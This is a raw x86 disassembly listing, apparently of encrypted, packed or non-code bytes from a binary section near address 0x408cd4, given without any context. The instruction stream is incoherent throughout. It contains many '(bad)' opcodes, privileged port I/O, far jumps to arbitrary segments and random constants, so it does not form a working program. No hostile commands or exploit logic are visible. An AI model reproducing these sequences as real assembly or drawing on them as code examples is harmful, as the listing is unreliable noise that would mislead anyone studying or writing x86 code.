  408cd4:	test   BYTE PTR [ebx+ebp*2-0x7258b7e8],cl
  408cdb:	cmc    
  408cdc:	xor    al,0xd6
  408cde:	addr16 lahf 
  408ce0:	stos   BYTE PTR es:[edi],al
  408ce1:	int3   
  408ce2:	xor    ecx,DWORD PTR [edi]
  408ce4:	bound  esp,QWORD PTR [edi-0x737be773]
  408cea:	ja     0x408d48
  408cec:	fcos   
  408cee:	push   0xa8d8361b
  408cf3:	xchg   edi,eax
  408cf4:	adc    eax,0x9ea7851c
  408cf9:	mul    DWORD PTR [edx]
  408cfb:	shl    dl,cl
  408cfd:	hlt    
  408cfe:	xchg   ecx,eax
  408cff:	mov    ds:0xbdb4438f,al
  408d04:	inc    eax
  408d05:	adc    DWORD PTR [edi-0x435f2d2b],ebp
  408d0b:	enter  0x6782,0x62
  408d0f:	es jg  0x408d08
  408d12:	addr16 fs fwait
  408d15:	ss (bad) 
  408d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d18:	repz sbb eax,0x83a2b70d
  408d1e:	in     al,dx
  408d1f:	test   ecx,eax
  408d21:	fnsave [esi-0x1f]
  408d24:	mov    ebx,ss
  408d26:	dec    esi
  408d27:	jb     0x408d17
  408d29:	pop    es
  408d2a:	sti    
  408d2b:	inc    ebx
  408d2c:	and    al,0xc9
  408d2e:	cwde   
  408d2f:	jg     0x408d32
  408d31:	xchg   edi,eax
  408d32:	fsubr  st,st(6)
  408d34:	jnp    0x408d3f
  408d36:	cmp    dh,BYTE PTR [edx+0x2b]
  408d39:	add    DWORD PTR gs:[ebx],ecx
  408d3c:	mov    al,0x81
  408d3e:	cmp    al,0xe2
  408d40:	push   es
  408d41:	dec    edx
  408d42:	stos   BYTE PTR es:[edi],al
  408d43:	jbe    0x408da4
  408d45:	fcom   DWORD PTR [ebp+0x61]
  408d48:	add    al,0x21
  408d4a:	cmp    eax,0x5b19d7f7
  408d4f:	(bad)  
  408d50:	in     eax,0x5c
  408d52:	int    0xc3
  408d54:	lds    edx,FWORD PTR [ebx]
  408d56:	adc    al,0xd8
  408d58:	jp     0x408d07
  408d5a:	push   0x69
  408d5c:	aaa    
  408d5d:	daa    
  408d5e:	mov    al,ds:0x1a8072b1
  408d63:	pop    ebx
  408d64:	push   esp
  408d65:	pop    es
  408d66:	out    dx,eax
  408d67:	(bad)  
  408d68:	jo     0x408dc8
  408d6a:	push   ds
  408d6b:	ins    DWORD PTR es:[edi],dx
  408d6c:	xor    al,0x1f
  408d6e:	add    dl,BYTE PTR [ebx-0x75c07e52]
  408d74:	jle    0x408d35
  408d76:	out    dx,al
  408d77:	dec    edx
  408d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d79:	mov    edx,0x4ea4a8a8
  408d7e:	retf   
  408d7f:	daa    
  408d80:	push   ds
  408d81:	cli    
  408d82:	sbb    eax,0x4a521e72
  408d87:	test   ax,di
  408d8a:	xchg   edi,eax
  408d8b:	or     al,0x93
  408d8d:	xchg   al,bh
  408d8f:	and    al,0xc6
  408d92:	ins    DWORD PTR es:[edi],dx
  408d93:	pop    ecx
  408d94:	(bad)  
  408d96:	mov    dl,0x3a
  408d98:	xor    al,BYTE PTR [eax-0x41]
  408d9b:	aaa    
  408d9c:	icebp  
  408d9d:	jmp    0x7e9b:0xff4f79c0
  408da4:	(bad)  
  408da5:	into   
  408da6:	inc    ebx
  408da7:	(bad)  [esp+eax*2-0x759d6c6a]
  408dae:	ror    DWORD PTR [ecx+0x9],1
  408db1:	push   0xb1d4406c
  408db6:	repnz in eax,0x63
  408db9:	sub    DWORD PTR [ebx],edx
  408dbb:	sbb    esi,ecx
  408dbd:	sti    
  408dbe:	mov    eax,ds:0x96be487d
  408dc3:	adc    ebx,ecx
  408dc5:	jmp    0x408d7b
  408dc7:	in     eax,0x90
  408dc9:	aaa    
  408dca:	cdq    
  408dcb:	adc    DWORD PTR [edx+0x5fecdbe7],edi
  408dd1:	pop    eax
  408dd2:	rol    BYTE PTR [ebx],0x22
  408dd5:	inc    ebx
  408dd6:	retf   0x8975
  408dd9:	cs ja  0x408da0
  408ddc:	xchg   BYTE PTR [edi],cl
  408dde:	add    eax,0x66f9cdb
  408de3:	out    0x8d,al
  408de5:	jbe    0x408e39
  408de7:	inc    esi
  408de8:	push   eax
  408de9:	test   eax,0xf808563b
  408dee:	adc    al,0xcd
  408df0:	jmp    0x408d8f
  408df2:	sbb    DWORD PTR [eax-0x7907147a],0x2c2cb762
  408dfc:	(bad)  
  408dfd:	dec    ebx
  408dfe:	je     0x408d9b
  408e00:	mov    ds:0x1b1ccd2c,eax
  408e05:	mov    dh,BYTE PTR [edx]
  408e07:	lods   al,BYTE PTR ds:[esi]
  408e08:	sub    BYTE PTR ds:0xf3c73a4a,ch
  408e0e:	icebp  
  408e0f:	and    dh,ch
  408e11:	scas   al,BYTE PTR es:[edi]
  408e12:	out    dx,al
  408e13:	xchg   ecx,eax
  408e14:	xlat   BYTE PTR ds:[ebx]
  408e15:	shr    DWORD PTR [ecx+0x6fb40c5f],cl
  408e1b:	lds    esp,FWORD PTR [edx]
  408e1d:	pop    esp
  408e1e:	(bad)  
  408e1f:	int3   
  408e20:	inc    edi
  408e21:	jmp    0x8cf5f957
  408e26:	fld    DWORD PTR [edi-0x61fa4aaf]
  408e2c:	or     DWORD PTR [ebx+0x4cd70d08],0xe8246ef0
  408e36:	or     al,0x3d
  408e38:	jno    0x408e78
  408e3a:	(bad)  
  408e3b:	aad    0xf
  408e3d:	add    cl,BYTE PTR [edx]
  408e3f:	daa    
  408e40:	mov    edi,0x243fb296
  408e45:	aaa    
  408e46:	and    DWORD PTR [ebx+0x3c],edx
  408e49:	call   0x700:0x4a589ee7
  408e50:	scas   al,BYTE PTR es:[edi]
  408e51:	pop    edi
  408e52:	push   0x4c6b7f3c
  408e57:	xchg   esi,eax
  408e58:	loope  0x408ed2
  408e5a:	cmp    cl,bl
  408e5c:	xor    BYTE PTR [esi-0x9],ch
  408e5f:	xchg   edx,eax
  408e60:	leave  
  408e61:	adc    al,0xd
  408e63:	arpl   WORD PTR [eax-0x538d3937],ax
  408e69:	call   0xfe327662
  408e6e:	adc    DWORD PTR ds:0xcfc0fd40,0xffffff81
  408e75:	cmp    ch,ch
  408e77:	fnstsw WORD PTR [ecx]
  408e79:	xor    BYTE PTR [ebx+0x36],0xb2
  408e7d:	in     eax,dx
  408e7e:	fisubr DWORD PTR [esi-0x7562e502]
  408e84:	sti    
  408e85:	ja     0x408efe
  408e87:	push   ebx
  408e88:	adc    BYTE PTR [edx],ch
  408e8a:	jmp    0x73431b29
  408e8f:	call   0xc3d43128
  408e94:	adc    BYTE PTR [edx+0x3010f3bf],cl
  408e9a:	xor    DWORD PTR [eax+0x67],ecx
  408e9d:	jns    0x408e9e
  408e9f:	and    eax,0x4dd10e1
  408ea4:	mov    bl,0x9f
  408ea6:	cwde   
  408ea7:	ret    
  408ea8:	push   ecx
  408ea9:	pushf  
  408eaa:	ins    BYTE PTR es:[edi],dx
  408eab:	mov    ds:0x47ddb24b,al
  408eb0:	test   DWORD PTR [ebp-0x7],eax
  408eb3:	push   ds
  408eb4:	cmp    eax,0xf659f331
  408eb9:	aad    0xd0
  408ebb:	mov    cl,0x3e
  408ebd:	pop    esi
  408ebe:	add    DWORD PTR [esi],edx
  408ec0:	cmp    al,BYTE PTR [edx-0x78]
  408ec3:	call   0x7d510615
  408ec8:	clc    
  408ec9:	and    DWORD PTR [eax],0x4e56b927
  408ecf:	rcl    DWORD PTR [edi-0x636b0823],1
  408ed5:	or     eax,0xd2c0c7af
  408eda:	loopne 0x408e9c
  408edc:	inc    ch
  408ede:	imul   ebp,DWORD PTR [ebx+0x2c],0xffffff95
  408ee2:	mov    ebp,DWORD PTR [eax]
  408ee4:	cmc    
  408ee5:	adc    DWORD PTR [edi],esi
  408ee7:	test   DWORD PTR [eax],edx
  408ee9:	fwait
  408eea:	mov    WORD PTR [esp-0x48],ss
  408eee:	inc    ebx
  408eef:	ror    DWORD PTR [esi+0x1f],0xaa
  408ef3:	leave  
  408ef4:	outs   dx,BYTE PTR ds:[esi]
  408ef5:	pop    ebp
  408ef6:	mov    es,esp
  408ef8:	hlt    
  408ef9:	xor    eax,0x523d91b1
  408efe:	dec    esi
  408eff:	or     al,0x12
  408f01:	sbb    eax,0xc3f3f07b
  408f06:	jne    0x408f40
  408f08:	fsub   DWORD PTR [ecx+edi*4-0x69]
  408f0c:	test   BYTE PTR [edi+0x5ec888c2],dh
  408f12:	loopne 0x408e99
  408f14:	push   eax
  408f15:	add    al,0x7b
  408f17:	mov    DWORD PTR [edi+0x56a8ec58],ebx
  408f1d:	mov    edx,0x3e4aebd6
  408f22:	out    dx,eax
  408f23:	jne    0x408f37
  408f25:	cmp    ebx,DWORD PTR [ebp+0x713f2042]
  408f2b:	in     al,dx
  408f2c:	(bad)  
  408f2d:	imul   BYTE PTR [ebx+0x51346cc3]
  408f33:	cmp    DWORD PTR [esi],0xc1f90e18
  408f39:	xchg   BYTE PTR [ecx],bh
  408f3b:	pushf  
  408f3c:	jbe    0x408f27
  408f3e:	or     ebx,DWORD PTR [edi+0x2b61c926]
  408f44:	retf   
  408f45:	xor    eax,0xa92c27a4
  408f4a:	adc    eax,0xd14237a2
  408f4f:	aas    
  408f50:	fcmovnbe st,st(6)
  408f52:	and    DWORD PTR [ebp-0x5f21411b],edx
  408f58:	aaa    
  408f59:	out    dx,eax
  408f5a:	sbb    BYTE PTR [esi],ch
  408f5c:	mov    ch,0xc8
  408f5e:	adc    al,0x32
  408f60:	sti    
  408f61:	xchg   ebp,eax
  408f62:	sub    eax,0xcbe44213
  408f67:	push   edi
  408f68:	dec    eax
  408f69:	and    ecx,ecx
  408f6b:	cmp    bh,BYTE PTR [eax]
  408f6d:	retf   0xa3de
  408f70:	mov    bh,0x34
  408f72:	dec    edi
  408f73:	lea    esi,[eax+eax*1]
  408f76:	mov    ss,WORD PTR [ebx-0x6e34bec7]
  408f7c:	xchg   edi,eax
  408f7d:	mov    DWORD PTR [ecx+0x782b1c5d],esp
  408f83:	retf   0xa8fb
  408f86:	or     edx,esp
  408f88:	mov    esp,0x19292ca8
  408f8d:	inc    esp
  408f8e:	fidivr WORD PTR [edi-0x35]
  408f91:	enter  0x4c81,0xf9
  408f95:	add    eax,0x4053fb7
  408f9a:	sbb    BYTE PTR [ecx+0x3d],bl
  408f9d:	xchg   BYTE PTR [esi+0xf],dh
  408fa0:	sbb    al,0x62
  408fa2:	pop    esi
  408fa3:	mov    dl,0x8e
  408fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fa6:	sub    al,0x45
  408fa8:	(bad)  
  408fa9:	ficom  DWORD PTR [ecx]
  408fab:	ror    edi,cl
  408fad:	ret    
  408fae:	jae    0x408fd9
  408fb0:	pop    ds
  408fb1:	mov    bl,0xb6
  408fb3:	inc    esp
  408fb4:	and    bl,bh
  408fb6:	sub    al,BYTE PTR [ebp+0x63]
  408fb9:	ds push esi
  408fbb:	in     al,dx
  408fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fbd:	pop    es
  408fbe:	jnp    0x40903c
  408fc0:	push   0xfffffff7
  408fc2:	imul   eax,DWORD PTR [esi],0xffffffa6
  408fc5:	dec    DWORD PTR [eax+0x95efc69]
  408fcb:	ins    DWORD PTR es:[edi],dx
  408fcc:	imul   DWORD PTR ds:[edi+0x45]
  408fd0:	xlat   BYTE PTR ds:[ebx]
  408fd1:	stos   DWORD PTR es:[edi],eax
  408fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fd3:	jl     0x409006
  408fd5:	mov    eax,0x32992a7c
  408fda:	mov    ds:0x23e5f647,eax
  408fdf:	popf   
  408fe0:	mov    ds:0xb05e252c,al
  408fe5:	jmp    0xbc4fa16e
  408fea:	inc    ecx
  408feb:	jae    0x408f8e
  408fed:	xchg   esp,eax
  408fee:	fisubr DWORD PTR [ebx+0x1ffe89d2]
  408ff4:	int    0xd0
  408ff6:	fadd   QWORD PTR [ecx]
  408ff8:	mov    bh,0x8e
  408ffa:	inc    edx
  408ffb:	inc    edi
  408ffc:	and    cl,BYTE PTR [edi]
  408ffe:	sbb    BYTE PTR [edx+0x597833c0],cl
  409004:	xlat   BYTE PTR ds:[ebx]
  409005:	push   0xfffffff1
  409007:	(bad)  
  409009:	add    al,0x3f
  40900b:	sbb    ch,BYTE PTR [esi]
  40900d:	inc    ebp
  40900e:	fbld   TBYTE PTR [esp+esi*2+0x68]
  409012:	xor    eax,0xe7151017
  409017:	sub    DWORD PTR [edx-0x6e],edi
  40901a:	repnz push edi
  40901c:	stos   BYTE PTR es:[edi],al
  40901d:	(bad)  
  40901e:	cmc    
  40901f:	pop    es
  409020:	cmc    
  409021:	add    al,0x3e
  409023:	test   DWORD PTR [edx],0xbefef83b
  409029:	mov    edx,0x8d64b4cb
  40902e:	cwde   
  40902f:	repnz inc edi
  409031:	scas   eax,DWORD PTR es:[edi]
  409032:	mov    ds:0xbfebeaf1,eax
  409037:	je     0x409094
  409039:	add    al,0x3c
  40903b:	test   eax,0x629f44b5
  409040:	push   esi
  409041:	mov    esi,0xa2c8e9e1
  409046:	jp     0x40906b
  409048:	jmp    0x7a39:0xe6b10b7b
  40904f:	xchg   ecx,eax
  409050:	nop
  409051:	mov    ds:0xcec17d30,eax
  409056:	pop    esp
  409057:	xchg   edi,eax
  409058:	repz add eax,0xd7345b87
  40905e:	ja     0x409055
  409060:	mov    esi,0x63cce57
  409065:	aaa    
  409066:	lea    ebp,ss:[ebp-0x26dce2c6]
  40906d:	lahf   
  40906e:	adc    BYTE PTR [edi-0x6a],dh
  409071:	out    0xac,al
  409073:	cwde   
  409074:	xlat   BYTE PTR ds:[ebx]
  409075:	pop    ecx
  409076:	push   0xbd33a8ee
  40907b:	shl    al,cl
  40907d:	por    mm2,QWORD PTR [edx]
  409080:	and    eax,0xcc3a46
  409085:	dec    esp
  409086:	and    DWORD PTR [esi-0x463bc63],eax
  40908c:	dec    esi
  40908d:	dec    ebp
  40908e:	xor    edi,DWORD PTR [esi]
  409090:	jmp    0x409098
  409092:	or     edx,ecx
  409094:	adc    al,0x8f
  409096:	mov    ds:0x1820dee,al
  40909b:	rol    DWORD PTR [edi],1
  40909d:	jno    0x409065
  40909f:	cwde   
  4090a0:	jbe    0x409024
  4090a2:	cmp    BYTE PTR [ecx],ch
  4090a4:	lea    ebp,[ecx]
  4090a6:	(bad)  
  4090a7:	cmp    al,0xd1
  4090a9:	jl     0x4090d1
  4090ab:	xor    ecx,ebx
  4090ad:	sahf   
  4090ae:	popf   
  4090af:	imul   ebp,DWORD PTR [esp+edx*2],0xffffffef
  4090b3:	ret    
  4090b4:	add    edx,DWORD PTR gs:[eax-0x14]
  4090b8:	dec    edi
  4090b9:	push   es
  4090ba:	stos   BYTE PTR es:[edi],al
  4090bb:	in     al,0x80
  4090bd:	stos   BYTE PTR es:[edi],al
  4090be:	cmovae esi,DWORD PTR [edi]
  4090c1:	mul    edx
  4090c3:	mov    edi,0x1b650c5d
  4090c8:	mov    ebp,0xa01fe3c2
  4090cd:	dec    ebp
  4090ce:	or     DWORD PTR [ecx-0x9],0x5297e5f8
  4090d5:	jno    0x409152
  4090d7:	mov    WORD PTR [esi],?
  4090d9:	and    esp,DWORD PTR [esi+eiz*8]
  4090dc:	sub    esi,DWORD PTR [esi-0x7f]
  4090df:	xor    ch,BYTE PTR [esi]
  4090e1:	xchg   esi,eax
  4090e2:	inc    eax
  4090e3:	in     eax,dx
  4090e4:	aad    0x2d
  4090e6:	nop
  4090e7:	mov    dl,0xb6
  4090e9:	or     BYTE PTR [ebx],bl
  4090eb:	xchg   edi,eax
  4090ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090ed:	jle    0x409101
  4090ef:	retf   
  4090f0:	mov    bl,0x1e
  4090f2:	ret    0x898
  4090f5:	les    esp,FWORD PTR gs:[edi-0x61]
  4090f9:	sub    al,0x7a
  4090fb:	ret    
  4090fc:	fnstsw WORD PTR [ebx-0x2692448c]
  409102:	xchg   edi,eax
  409103:	scas   al,BYTE PTR es:[edi]
  409104:	mov    bh,0x50
  409106:	or     esi,0xffffffc4
  409109:	add    ah,BYTE PTR [edi-0x4f2f5111]
  40910f:	sbb    edi,edx
  409111:	or     ch,BYTE PTR [esp+ebx*4-0xe]
  409115:	mov    ebx,0x5d21c916
  40911a:	or     al,0x68
  40911c:	outs   dx,BYTE PTR ds:[esi]
  40911d:	mov    ds:0xae0c78a2,eax
  409122:	adc    al,BYTE PTR [ebx-0x4065e138]
  409128:	push   ds
  409129:	push   ss
  40912a:	mov    eax,0xfea850dd
  40912f:	stos   BYTE PTR es:[edi],al
  409130:	out    0x65,eax
  409132:	mov    fs,WORD PTR [esi]
  409134:	inc    ebp
  409135:	call   0xd1a1:0x1d7c1a3a
  40913c:	call   0x49cd921c
  409141:	dec    esi
  409142:	cmp    al,0x70
  409144:	scas   eax,DWORD PTR es:[edi]
  409145:	inc    ecx
  409146:	mov    esp,0x87a54e21
  40914b:	push   0xe1061fc
  409150:	sub    eax,0x64022f9f
  409155:	mov    ah,0xfe
  409157:	out    0xce,eax
  409159:	inc    esp
  40915a:	por    mm0,QWORD PTR [ebx-0x5943cc28]
  409161:	ja     0x409113
  409163:	or     dl,0x79
  409166:	loopne 0x409128
  409168:	ds leave 
  40916a:	loop   0x4090f0
  40916c:	scas   al,BYTE PTR es:[edi]
  40916d:	mov    cs,WORD PTR [ebx+0x10d66951]
  409173:	sub    eax,0x24b07503
  409178:	mov    cl,0x25
  40917a:	sbb    dl,ch
  40917c:	jns    0x409111
  40917e:	idiv   BYTE PTR cs:[esi+0x683f30ef]
  409185:	xchg   esi,eax
  409186:	cmp    al,0xf8
  409188:	ja     0x4091a0
  40918a:	mov    al,0x89
  40918c:	add    DWORD PTR [edx+0x5b],0xffffffba
  409190:	cs hlt 
  409192:	scas   eax,DWORD PTR es:[edi]
  409193:	clc    
  409194:	jo     0x4091db
  409196:	sbb    al,0xe3
  409198:	shl    DWORD PTR [ebp+0x4486f4dc],1
  40919e:	adc    DWORD PTR [ebx+edx*8-0x7ae06959],esp
  4091a5:	dec    ecx
  4091a6:	out    dx,eax
  4091a7:	push   eax
  4091a8:	ins    BYTE PTR es:[edi],dx
  4091a9:	inc    esp
  4091aa:	mov    bh,0xda
  4091ac:	lock (bad) [ebx-0x7f]
  4091b0:	cmp    edi,DWORD PTR [ecx]
  4091b2:	jnp    0x4091e5
  4091b4:	xchg   ebx,eax
  4091b5:	lock and edi,DWORD PTR ss:[esp+ebp*4]
  4091ba:	mov    cs,WORD PTR [ebp+0x23]
  4091bd:	push   edi
  4091be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091bf:	fidivr WORD PTR [edi-0x1d1bc73e]
  4091c5:	xchg   edx,eax
  4091c6:	cmp    edi,DWORD PTR [eax]
  4091c8:	daa    
  4091c9:	test   al,0x24
  4091cb:	dec    esi
  4091cc:	mov    esp,0x9c47a85e
  4091d1:	mov    dh,0xad
  4091d3:	add    ch,BYTE PTR [eax-0x28]
  4091d6:	scas   eax,DWORD PTR es:[edi]
  4091d7:	cmp    BYTE PTR [ebx-0x27a14aaa],cl
  4091dd:	cmp    DWORD PTR [edx-0xf],esi
  4091e0:	inc    edi
  4091e1:	aas    
  4091e2:	icebp  
  4091e3:	sbb    ecx,edx
  4091e5:	ja     0x409167
  4091e7:	add    ecx,esp
  4091e9:	leave  
  4091ea:	scas   eax,DWORD PTR es:[edi]
  4091eb:	jmp    0x6e4a7093
  4091f0:	or     ecx,DWORD PTR [ebx+0x6]
  4091f3:	ds popf 
  4091f5:	(bad)  
  4091f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091f7:	sbb    dh,bh
  4091f9:	jbe    0x4091af
  4091fb:	ja     0x4091b7
  4091fd:	xchg   ecx,eax
  4091fe:	inc    esi
  4091ff:	out    0x70,al
  409201:	and    BYTE PTR [eax],ch
  409203:	jg     0x40921d
  409205:	loope  0x40923e
  409207:	aaa    
  409208:	rcr    ah,0x1a
  40920b:	mov    esi,0xec4656a5
  409210:	addr16 sub edi,esi
  409213:	ss inc edx
  409215:	sbb    ch,ah
  409217:	hlt    
  409218:	(bad)  
  409219:	nop
  40921a:	bound  ebp,QWORD PTR [ecx+0x72]
  40921d:	pop    ds
  40921e:	jae    0x409224
  409220:	cmp    BYTE PTR [edx+edx*1+0x8],dl
  409224:	jmp    0x4091e1
  409226:	add    DWORD PTR [edx+0x53e8f21a],ecx
  40922c:	and    BYTE PTR [eax],ch
  40922e:	mov    DWORD PTR [ebx-0x477edc15],0x44891611
  409238:	mov    al,0x85
  40923a:	repnz adc eax,0xcb92dc14
  409240:	dec    edi
  409241:	push   eax
  409242:	push   ss
  409243:	sti    
  409244:	inc    esi
  409245:	sub    bh,BYTE PTR [esi-0x4f]
  409248:	retf   
  409249:	pop    edi
  40924a:	cdq    
  40924b:	xor    ebx,DWORD PTR [edx-0x5e7c9c13]
  409251:	xor    dh,ch
  409253:	add    DWORD PTR [esi-0x6],ecx
  409256:	retf   
  409257:	jmp    0xc1a0:0x1cd3cf27
  40925e:	or     bl,BYTE PTR [eax]
  409260:	jmp    0x3e8cf17b
  409265:	cmp    dl,cl
  409267:	sbb    BYTE PTR [edi],bl
  409269:	sub    al,0x71
  40926b:	shr    BYTE PTR ds:0x67dbfd3d,1
  409271:	fisubr DWORD PTR [ebp+0x35]
  409274:	retf   
  409275:	sbb    DWORD PTR [ebx-0x67],eax
  409278:	in     eax,dx
  409279:	adc    BYTE PTR [edi+0xc],dl
  40927c:	arpl   WORD PTR [edx+0x7b3a0ca9],di
  409282:	inc    ebp
  409283:	mov    WORD PTR [ebx-0x34],gs
  409286:	mov    edx,0x9db599c7
  40928b:	jne    0x4092e3
  40928d:	sbb    BYTE PTR [ebx+edi*1-0x5d5bec9d],al
  409294:	mov    bl,0xad
  409296:	ss addr16 sub al,0x6b
  40929a:	jb     0x4092e1
  40929c:	xchg   edi,eax
  40929d:	ror    BYTE PTR [edi+0x57],1
  4092a0:	sub    BYTE PTR [edx-0x75],bl
  4092a3:	les    edi,FWORD PTR [eax-0xd]
  4092a6:	jge    0x4092a4
  4092a8:	jecxz  0x409238
  4092aa:	cmp    al,0x1f
  4092ac:	call   0x40e4:0xb1852bb8
  4092b3:	sahf   
  4092b4:	add    al,0xa5
  4092b6:	imul   eax,edi,0xada34f6b
  4092bc:	fist   WORD PTR [eax+0x40]
  4092bf:	or     eax,0xa9168429
  4092c4:	inc    eax
  4092c5:	jl     0x409302
  4092c7:	in     al,dx
  4092c8:	push   esp
  4092c9:	lods   al,BYTE PTR ds:[esi]
  4092ca:	cmp    al,0xd
  4092cc:	scas   al,BYTE PTR es:[edi]
  4092cd:	jmp    0x6fa49491
  4092d2:	mov    ecx,0x8dc5ecbe
  4092d7:	adc    BYTE PTR [ecx+0x56],dh
  4092da:	push   esi
  4092db:	mov    ch,0xf7
  4092dd:	jno    0x40926b
  4092df:	aaa    
  4092e0:	adc    ebp,esp
  4092e2:	or     eax,0x8866457a
  4092e7:	pop    edx
  4092e8:	in     eax,dx
  4092e9:	fstp   DWORD PTR [edx]
  4092eb:	in     eax,0x2
  4092ed:	jecxz  0x409310
  4092ef:	stos   DWORD PTR es:[edi],eax
  4092f0:	push   0x1907ab18
  4092f5:	cli    
  4092f6:	(bad)  
  4092f7:	std    
  4092f8:	dec    esp
  4092f9:	sbb    ebx,DWORD PTR [esi]
  4092fb:	fstsw  WORD PTR [ecx+0x4698414d]
  409302:	push   edx
  409303:	lods   eax,DWORD PTR ds:[esi]
  409304:	lea    esp,[eax-0x65]
  409307:	or     DWORD PTR ds:0xafa9f9ae,esi
  40930d:	stc    
  40930e:	push   es
  40930f:	mov    ds:0x4568834a,eax
  409314:	lods   al,BYTE PTR ds:[esi]
  409315:	addr16 and al,0x6a
  409318:	or     cl,BYTE PTR [edi]
  40931a:	sbb    eax,0x728063a5
  40931f:	das    
  409320:	jae    0x4092b0
  409322:	xor    eax,0x5f95293b
  409327:	jl     0x409329
  409329:	mov    ah,0x8d
  40932b:	ret    0x45bf
  40932e:	idiv   BYTE PTR [ecx+0x44]
  409331:	aaa    
  409332:	sahf   
  409333:	lds    esp,FWORD PTR [eax-0x33]
  409336:	mov    eax,0xe09a416a
  40933b:	test   eax,0xd5426909
  409340:	mov    al,ds:0x1f4b6662
  409345:	jl     0x409314
  409347:	leave  
  409348:	lahf   
  409349:	cdq    
  40934a:	js     0x40934e
  40934c:	retf   0xcff2
  40934f:	std    
  409350:	inc    edi
  409351:	mov    DWORD PTR [edi],ebp
  409353:	add    eax,0x22f180b8
  409358:	sti    
  409359:	xor    eax,0xccc107df
  40935e:	mov    eax,0x6de56b2c
  409363:	dec    ebx
  409364:	pop    ebp
  409365:	mov    cl,0xaa
  409367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409368:	loop   0x409394
  40936a:	sub    al,0x0
  40936c:	mov    es,WORD PTR [ebx]
  40936e:	sub    dl,bh
  409370:	sti    
  409371:	and    BYTE PTR [eax],dl
  409373:	mov    ds:0x3508fb1e,al
  409378:	shl    BYTE PTR [eax+eiz*8+0x31d30803],cl
  40937f:	mov    edi,0xdc70758e
  409384:	pop    esi
  409385:	lods   eax,DWORD PTR ds:[esi]
  409386:	fldcw  WORD PTR [edx+eax*1-0x74]
  40938a:	push   ebx
  40938b:	js     0x40931c
  40938d:	arpl   WORD PTR [ebx],si
  40938f:	in     al,0x3d
  409391:	add    DWORD PTR [edi-0x48],esp
  409394:	add    dl,BYTE PTR [ecx+edi*8+0x608755de]
  40939b:	addr16 retf 0xf568
  40939f:	pop    ss
  4093a0:	push   esi
  4093a1:	cmc    
  4093a2:	mov    ecx,0x1df50149
  4093a7:	mov    edi,0x6754b417
  4093ac:	mov    ds:0xb45dcd45,eax
  4093b1:	push   ds
  4093b2:	push   cs
  4093b3:	cdq    
  4093b4:	pop    ecx
  4093b5:	loope  0x4093aa
  4093b7:	adc    DWORD PTR [edi+0x49],0x58bf0ca
  4093be:	xchg   ebp,eax
  4093bf:	repnz loope 0x4093f5
  4093c2:	jae    0x4093bf
  4093c4:	fld    TBYTE PTR [esi+0x27]
  4093c7:	mov    ebp,0xcf65d3df
  4093cc:	jle    0x4093e4
  4093ce:	std    
  4093cf:	xchg   esp,eax
  4093d0:	adc    BYTE PTR [esi],bl
  4093d2:	je     0x409388
  4093d4:	pushf  
  4093d5:	stos   BYTE PTR es:[edi],al
  4093d6:	adc    eax,0x51dc104b
  4093db:	ret    0xf937
  4093de:	mov    bh,0xc4
  4093e0:	mov    edi,DWORD PTR [ebx+0x509fb5c9]
  4093e6:	dec    edi
  4093e7:	iret   
  4093e8:	pop    edx
  4093e9:	inc    eax
  4093ea:	inc    eax
  4093eb:	cmp    DWORD PTR [ebx+eiz*2-0x5c],esi
  4093ef:	ret    
  4093f0:	mov    BYTE PTR [ebp-0x67],ch
  4093f3:	retf   0xbf40
  4093f6:	cmc    
  4093f7:	adc    DWORD PTR [edi*1+0x4060e6ff],0xffffffa1
  4093ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409400:	pop    ebp
  409401:	loopne 0x409455
  409403:	mov    ds:0x6fb96c09,al
  409408:	dec    ebx
  409409:	out    dx,al
  40940a:	out    dx,eax
  40940b:	std    
  40940c:	lahf   
  40940d:	pop    esp
  40940e:	mov    cs,esp
  409410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409411:	out    dx,eax
  409412:	test   eax,0x792e3fa2
  409417:	dec    ebp
  409418:	clc    
  409419:	inc    eax
  40941a:	mov    dl,0xc5
  40941c:	add    BYTE PTR [edi-0x20],ch
  40941f:	adc    ch,ah
  409421:	addr16 dec ebp
  409423:	add    ch,BYTE PTR [edi]
  409425:	pop    edx
  409426:	jl     0x409483
  409428:	push   ds
  409429:	lods   al,BYTE PTR ds:[esi]
  40942a:	xor    DWORD PTR [ebp+0x34df0689],ebx
  409430:	loope  0x409480
  409432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409433:	out    dx,al
  409434:	lods   al,BYTE PTR ds:[esi]
  409435:	xchg   ecx,eax
  409436:	mov    al,ds:0xfa7acb4
  40943b:	ficomp DWORD PTR [ebp+0x46]
  40943e:	test   al,0xc4
  409440:	cld    
  409441:	xchg   edx,eax
  409442:	(bad)  
  409443:	pop    edx
  409444:	enter  0xf425,0x7e
  409448:	jg     0x40941a
  40944a:	test   eax,0xbd30aefe
  40944f:	out    0xb4,eax
  409451:	inc    ebp
  409452:	(bad)  
  409453:	fs shl ebx,0x24
  409457:	shr    BYTE PTR [ebp+0x46],cl
  40945a:	outs   dx,BYTE PTR ds:[esi]
  40945b:	and    eax,DWORD PTR [ebp+0x21fe61a6]
  409461:	fcomp  DWORD PTR [eax]
  409463:	dec    eax
  409464:	ret    0x96ba
  409467:	arpl   WORD PTR [eax+0x2c0e1a5a],ax
  40946d:	aam    0x2f
  40946f:	pushw  0x9760
  409473:	mov    ecx,0x8d899b32
  409478:	adc    DWORD PTR [ecx+0x63],0x5713a086
  40947f:	cmp    eax,0xfa4b5a00
  409484:	mov    DWORD PTR [eax-0x6f],ecx
  409487:	add    eax,0x7777ce45
  40948c:	aad    0x7
  40948e:	and    al,0xe2
  409490:	stc    
  409491:	cli    
  409492:	mov    esi,0x75542f7e
  409497:	cmp    eax,0x642b6ec
  40949c:	mov    ds:0xb9df4c70,al
  4094a1:	sbb    DWORD PTR [esi],esp
  4094a3:	push   ebx
  4094a4:	stos   BYTE PTR es:[edi],al
  4094a5:	add    al,0xd8
